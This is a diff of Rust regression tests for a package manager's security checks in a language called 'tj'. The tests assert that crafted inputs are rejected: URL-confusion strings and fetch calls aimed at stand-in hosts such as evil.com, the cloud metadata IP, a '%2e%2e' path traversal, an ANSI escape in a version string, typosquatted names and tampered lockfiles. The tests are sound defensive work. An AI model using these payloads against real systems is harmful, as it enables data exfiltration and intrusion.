+        // REG-5: `http://localhost:pass@evil.com` is NOT loopback; metadata IP is rejected; redirect to non-HTTPS refused.
+        assert!(!is_loopback_http("http://localhost:pass@evil.com/pwn.tj"));
+        assert!(!is_loopback_http("http://127.0.0.1:notaport/x"));
+        assert!(!is_safe_remote_url("https://169.254.169.254/latest/meta-data", false));
+        assert!(!is_safe_remote_url("https://evil.com\\@allowed.com/x", false));
+
+        // REG-6: `https://evil.com\@allowed.com`, IPv6 `[2001:db8::1]`, and uppercase `HTTP://`.
+        let backslash = b"export async function g(): any { return await fetch(\"https://evil.com\\\\@allowed.com/steal\") }\n";
+        let mut m = base.clone();
+        m.permissions.network = vec!["allowed.com".into()];
+        m.sha256 = sha256_bytes(backslash);
+        assert!(verify_package_source(&m, backslash).is_err());
+
+        let ipv6 = b"export async function g(): any { return await fetch(\"https://[2001:db8::1]/api\") }\n";
+        let mut m = base.clone();
+        m.permissions.network = vec!["[2001:db8::1]".into()];
+        m.sha256 = sha256_bytes(ipv6);
+        assert!(verify_package_source(&m, ipv6).is_ok(), "{:?}", verify_package_source(&m, ipv6));
+        m.permissions.network = vec!["2001".into()];
+        assert!(verify_package_source(&m, ipv6).is_err());
+
+        let upper_http = b"export async function g(): any { return await fetch(\"HTTP://evil.example/leak\") }\n";
+        let mut m = base.clone();
+        m.permissions.network = vec!["*".into()];
+        m.sha256 = sha256_bytes(upper_http);
+        let errs = verify_package_source(&m, upper_http).unwrap_err();
+        assert!(errs.iter().any(|e| e.contains("plain http://")), "{errs:?}");
+
+        // REG-7: Relative `./secret` and unresolved external `tj:other` imports are rejected.
+        let rel = b"import { x } from \"./secret\"\nexport function f(): any { return x }\n";
+        let mut m = base.clone();
+        m.sha256 = sha256_bytes(rel);
+        assert!(verify_package_source(&m, rel).unwrap_err().iter().any(|e| e.contains("local file")));
+
+        let ext = b"import { x } from \"tj:nonexistent\"\nexport function f(): any { return x }\n";
+        let mut m = base.clone();
+        m.sha256 = sha256_bytes(ext);
+        assert!(verify_package_source(&m, ext).unwrap_err().iter().any(|e| e.contains("external module")));
+
+        // REG-10 & REG-11: semver ANSI escape, `%2e%2e` entry, unknown `@pii`, built-in typosquats.
+        let mut bad = base.clone();
+        bad.version = "1.0.0-\x1b[2Kspoof".into();
+        bad.entry = "%2e%2e/main/backdoor.tj".into();
+        bad.permissions.pii = vec!["bogus_pii".into()];
+        bad.name = "agents".into();
+        bad.sha256 = "0".repeat(64);
+        let errs = validate_manifest(&bad, None, false);
+        assert!(errs.iter().any(|e| e.contains("semver")), "{errs:?}");
+        assert!(errs.iter().any(|e| e.contains("entry path")), "{errs:?}");
+        assert!(errs.iter().any(|e| e.contains("unknown @pii")), "{errs:?}");
+        assert!(errs.iter().any(|e| e.contains("built-in module `tj:agent`")), "{errs:?}");
+
+        // REG-9 & REG-12: tampered lockfile metadata rejected; `tj retro` returns structured finding on tampered package.
+        let dir = temp_dir("retro-tamper");
+        std::fs::create_dir_all(dir.join(".tj-packages/good")).unwrap();
+        let src = b"export function ok(): number { return 1 }\n";
+        std::fs::write(dir.join(".tj-packages/good/plugin.tj"), b"export function ok(): number { return 999 }\n").unwrap();
+        let mut lock = Lockfile::default();
+        lock.packages.insert(
+            "good".into(),
+            LockedPackage {
+                kind: "library".into(),
+                version: "1.0.0".into(),
+                trust: Trust::Verified,
+                source: "https://github.com/someone/tj-good".into(),
+                entry: "plugin.tj".into(),
+                commit: "a".repeat(40),
+                sha256: sha256_bytes(src),
+                license: "MIT".into(),
+                publisher: "someone".into(),
+                permissions: Permissions::default(),
+                flagged: None,
+            },
+        );
+        write_lockfile(&dir, &lock).unwrap();
+        let app_file = dir.join("app.tj");
+        std::fs::write(&app_file, "import { ok } from \"tj:good\"\nfunction App() { return <Text>{ok()}</Text> }\n").unwrap();
+        let report = crate::retro::analyze(&app_file, None, None).expect("retro returns structured findings");
+        assert!(report.findings.iter().any(|f| f.tag == "fix" && f.area == "supply-chain"), "{:?}", report.findings);
+
+        // REG-9: bad `commit` in `tj.lock` rejected even if file hash matches.
+        std::fs::write(dir.join(".tj-packages/good/plugin.tj"), src).unwrap();
+        lock.packages.get_mut("good").unwrap().commit = "main".into();
+        write_lockfile(&dir, &lock).unwrap();
+        assert!(check_lockfile(&dir, None).unwrap_err().contains("40-character"));
+
+        // REG-13: third-party plugin PII transfer recorded by `tj_core::flow`!
+        let bundle = "//# file: app.tj\nimport { send } from \"tj:stripe\"\n@server @read(\"owner\") object User {\n  @pii(\"contact\", \"billing\") email: string = \"a@b.c\"\n  @allow(\"owner\") async pay() { await send(reveal(this.email, \"billing\")) }\n}\n//# file: tj:stripe\nexport async function send(x: string): any { return await plugin(\"stripe\", \"charge\", { x }) }\n";
+        let facts = tj_core::facts(bundle);
+        assert!(
+            facts.transfers.iter().any(|t| matches!(&t.to, tj_core::flow::Destination::Plugin(p) if p == "tj:stripe")),
+            "expected tj:stripe in facts.transfers, got {:?}",
+            facts.transfers
+        );
+
         let _ = std::fs::remove_dir_all(&dir);
     }
 }
